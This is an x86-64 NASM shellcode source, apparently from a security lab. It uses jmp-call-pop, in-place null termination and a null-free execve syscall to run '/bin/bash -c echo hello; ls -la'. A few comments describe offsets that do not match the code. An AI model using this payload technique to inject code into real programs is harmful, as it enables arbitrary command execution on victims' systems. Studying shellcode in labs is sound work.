ARGV equ 33
section .text
  global _start
    _start:
	    BITS 64
	    jmp short two
    one:
 	    pop rbx           

      xor al, al
      mov [rbx+9],  al
      mov [rbx+12], al
      mov [rbx+ARGV-1], al

 	    mov [rbx+ARGV],  rbx  ; store rbx to memory at address rbx + 8
      lea rcx, [rbx+10]
      mov [rbx+ARGV+8], rcx
      lea rcx, [rbx+13]
      mov [rbx+ARGV+16], rcx
      xor rax, rax
 	    mov [rbx+ARGV+24], rax  ; store rax to memory at address rbx + 16

      mov rdi, rbx       ; rdi = rbx
 	    lea rsi, [rbx+ARGV]   ; rsi = rbx + 8    
      mov rdx, rax      ; rdx = 0
 	    mov rax, 0xFFFFFFFFFFFFFF3B        ; rax = 59
      shl rax, 56
      shr rax, 56
 	    syscall
     two:
        call one                                                                   
        db '/bin/bash*' ; The command string (terminated by a zero)
        db '-c*'
        db 'echo hello; ls -la *'

        db 'AAAAAAAA'      ; Place holder for argv[0] 
        db 'BBBBBBBB'      ; Place holder for argv[1]
        db 'CCCCCCCC'      ; Place holder for argv[2]
        db 'DDDDDDDD'      ; Place holder for argv[3]
